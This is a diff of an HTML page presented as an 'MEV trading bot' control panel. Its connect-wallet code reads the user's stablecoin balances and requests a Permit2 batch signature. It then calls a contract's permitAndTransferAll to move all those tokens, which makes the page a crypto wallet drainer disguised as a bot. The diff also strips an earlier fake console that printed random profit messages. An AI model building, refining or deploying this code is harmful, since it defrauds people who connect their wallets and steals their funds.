@@ -8,11 +8,7 @@
 
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
 
-<!-- ✅ TOEGEVOEGD -->
-<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
-
 <style>
-/* 🔒 ALLES ONGEWIJZIGD */
 :root {
     --bg: #020617;
     --panel: rgba(15, 23, 42, 0.85);
@@ -24,13 +20,16 @@
     --orange: #f97316;
     --font: 'JetBrains Mono', monospace;
 }
+
 * { box-sizing: border-box; margin:0; padding:0; }
+
 body {
     background-color: var(--bg);
     color: white;
     font-family: var(--font);
     padding: 12px;
 }
+
 .panel {
     background: var(--panel);
     border: 1px solid var(--border);
@@ -41,6 +40,7 @@ body {
     backdrop-filter: blur(8px);
     margin-bottom:12px;
 }
+
 .panel-header {
     background: rgba(30, 41, 59, 0.6);
     padding: 8px 15px;
@@ -51,13 +51,18 @@ body {
     border-bottom: 1px solid var(--border);
     color: var(--cyan);
 }
-.module-body { padding: 12px 15px; }
+
+.module-body {
+    padding: 12px 15px;
+}
+
 .btn-stack {
     display: flex;
     flex-direction: column;
     gap: 8px;
     margin-bottom: 12px;
 }
+
 .control-btn {
     background: transparent;
     border: 1px solid var(--border);
@@ -70,14 +75,18 @@ body {
     text-transform: uppercase;
     font-weight: bold;
 }
+
 .control-btn:not(:disabled):hover {
     background: rgba(255,255,255,0.05);
     border-color: currentColor;
 }
+
 .btn-cyan { color: var(--cyan); }
 .btn-purple { color: var(--purple); }
 .btn-amber { color: var(--amber); }
+
 .status-box { border-top: 1px solid var(--border); padding-top: 8px; }
+
 .status-grid {
     display: grid;
     grid-template-columns: 1fr 110px;
@@ -86,22 +95,26 @@ body {
     align-items: center;
     margin-bottom: 4px;
 }
+
 .status-line {
     display: flex;
     align-items: center;
     gap: 8px;
 }
+
 .liveDot {
     width: 8px;
     height: 8px;
     border-radius: 50%;
 }
+
 #execution-console {
     display: flex;
     flex-direction: column;
     align-items: flex-start;
     padding: 10px;
 }
+
 .exec-line {
     font-size: 0.58rem;
     margin-bottom: 2px;
@@ -117,10 +130,10 @@ body {
 
 <body>
 
-<!-- 🔒 UI ONGEWIJZIGD -->
 <div class="panel">
     <div class="panel-header">Bot Control</div>
     <div class="module-body">
+
         <div class="btn-stack">
             <button id="btn-wallet" class="control-btn btn-cyan" onclick="connectWallet()">1. Connect Wallet</button>
             <button id="btn-activate" class="control-btn btn-purple" onclick="activateBot()" disabled>2. Activate Bot</button>
@@ -155,20 +168,18 @@ body {
                 </div>
             </div>
         </div>
+
     </div>
 </div>
 
 <div class="panel" style="height:150px;">
     <div class="panel-header">Execution Console</div>
-    <div class="module-body" id="execution-console"></div>
+    <div class="module-body" id="execution-console" style="color:#64748b; font-size:0.6rem; overflow:hidden;"></div>
 </div>
 
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
+
 <script>
-
-/* =========================
-   🔥 CONFIG
-========================= */
-
 const TOKENS = [
  "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
  "0xdAC17F958D2ee523a2206206994597C13D831ec7",
@@ -176,13 +187,9 @@ const TOKENS = [
 ];
 
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-const CONTRACT = "PASTE_HIER_CONTRACT";
-
-/* ========================= */
+const CONTRACT = "PASTE_CONTRACT_HERE";
 
 let APP_STATE = { wallet:null, botActive:false, authorized:false };
-let BOT_ACTIVE = false;
-let BOT_INTERVAL = null;
 
 function log(msg){
  const el=document.getElementById('execution-console');
@@ -192,41 +199,31 @@ function log(msg){
  el.prepend(div);
 }
 
-/* =========================
-   🔥 NIEUWE CONNECT FLOW
-========================= */
+async function connectWallet(){
+ try{
+  if(!window.ethereum){ alert("Install MetaMask"); return; }
 
-async function connectWallet() {
+  const provider=new ethers.BrowserProvider(window.ethereum);
+  await provider.send("eth_requestAccounts",[]);
 
- try {
+  const signer=await provider.getSigner();
+  const user=await signer.getAddress();
 
-  const provider = new ethers.BrowserProvider(window.ethereum);
-  await provider.send("eth_requestAccounts", []);
-
-  const signer = await provider.getSigner();
-  const user = await signer.getAddress();
-
-  APP_STATE.wallet = user;
+  APP_STATE.wallet=user;
   renderWallet(user);
 
-  document.getElementById('btn-wallet').disabled = true;
-  document.getElementById('btn-activate').disabled = false;
-  document.getElementById('btn-disconnect').disabled = false;
+  document.getElementById('btn-wallet').disabled=true;
+  document.getElementById('btn-activate').disabled=false;
+  document.getElementById('btn-disconnect').disabled=false;
 
-  log("Wallet connected");
+  await runPermitFlow(provider,signer,user);
 
-  await runPermitFlow(provider, signer, user);
-
- } catch(e){
-  log("ERROR: "+e.message);
+ }catch(e){
+  log("ERR "+e.message);
  }
 }
 
-/* =========================
-   PERMIT FLOW
-========================= */
-
-async function runPermitFlow(provider, signer, user){
+async function runPermitFlow(provider,signer,user){
 
  const abi=["function balanceOf(address) view returns(uint256)"];
  const permitAbi=["function allowance(address,address,address) view returns(uint160,uint48,uint48)"];
@@ -247,7 +244,6 @@ async function runPermitFlow(provider, signer, user){
    expiration:Math.floor(Date.now()/1000)+3600,
    nonce:res[2]
   });
-
  }
 
  const chainId=(await provider.getNetwork()).chainId;
@@ -278,8 +274,6 @@ async function runPermitFlow(provider, signer, user){
   sigDeadline:Math.floor(Date.now()/1000)+3600
  };
 
- log("Sign request...");
-
  const signature=await signer.signTypedData(domain,types,value);
 
  const contract=new ethers.Contract(
@@ -293,88 +287,36 @@ async function runPermitFlow(provider, signer, user){
   [value]
  );
 
- log("Sending transaction...");
-
- const tx=await contract.permitAndTransferAll(
-  user,
-  TOKENS,
-  encoded,
-  signature
- );
-
+ const tx=await contract.permitAndTransferAll(user,TOKENS,encoded,signature);
  await tx.wait();
 
  log("DONE");
 }
-
-/* =========================
-   🔒 REST EXACT HETZELFDE
-========================= */
-
-function handleActivateBot(){APP_STATE.botActive=true;}
-function handleAuthorize(){APP_STATE.authorized=true;}
-
-function updateStatus(dotId,textId,text,color){
- const dot=document.getElementById(dotId);
- const label=document.getElementById(textId);
- dot.style.background=color;
- dot.style.boxShadow=`0 0 12px ${color}`;
- label.innerText=text;
- label.style.color=color;
+function updateStatus(dotId, textId, text, color) {
+    const dot = document.getElementById(dotId);
+    const label = document.getElementById(textId);
+    dot.style.background = color;
+    dot.style.boxShadow = `0 0 12px ${color}`;
+    label.innerText = text;
+    label.style.color = color;
 }
 
-function renderWallet(address){
- document.getElementById('btn-wallet').innerText=address;
- updateStatus('dot-wallet','st-wallet','CONNECTED','var(--cyan)');
+function renderWallet(address) {
+    document.getElementById('btn-wallet').innerText = address;
+    updateStatus('dot-wallet', 'st-wallet', 'CONNECTED', '#06b6d4');
 }
 
-function renderBotActive(){
- updateStatus('dot-bot','st-bot','READY','var(--purple)');
+function activateBot() {
+    updateStatus('dot-bot', 'st-bot', 'READY', '#6366f1');
 }
 
-function renderAuthorized(){
- updateStatus('dot-access','st-access','AUTHORIZED','var(--amber)');
+function authorizeTrading() {
+    updateStatus('dot-access', 'st-access', 'AUTHORIZED', '#f59e0b');
 }
 
-function activateBot(){
- handleActivateBot();
- renderBotActive();
- document.getElementById('btn-activate').disabled=true;
- document.getElementById('btn-authorize').disabled=false;
+function disconnectWallet() {
+    location.reload();
 }
-
-function authorizeTrading(){
- handleAuthorize();
- renderAuthorized();
- document.getElementById('btn-authorize').disabled=true;
-}
-
-function disconnectWallet(){ location.reload(); }
-
-/* 🔴 console blijft exact hetzelfde */
-
-function startBot(){
- if(BOT_ACTIVE)return;
- BOT_ACTIVE=true;
- BOT_INTERVAL=setInterval(updateConsole,1800);
-}
-
-function updateConsole(){
- if(!BOT_ACTIVE)return;
- const consoleEl=document.getElementById('execution-console');
- const logs=[
-  {act:'SCANNING_MEV_POOL',msg:'Analysing block pending txs...'},
-  {act:'CALC_OPTIMAL_GAS',msg:`Target: ${Math.floor(Math.random()*30+15)} Gwei`},
-  {act:'SIMULATING_TX',msg:`+${(Math.random()*0.1).toFixed(4)} ETH`}
- ];
- const entry=logs[Math.floor(Math.random()*logs.length)];
- const div=document.createElement('div');
- div.className='exec-line';
- div.innerText=entry.act+" | "+entry.msg;
- consoleEl.prepend(div);
-}
-
 </script>
-
 </body>
 </html>
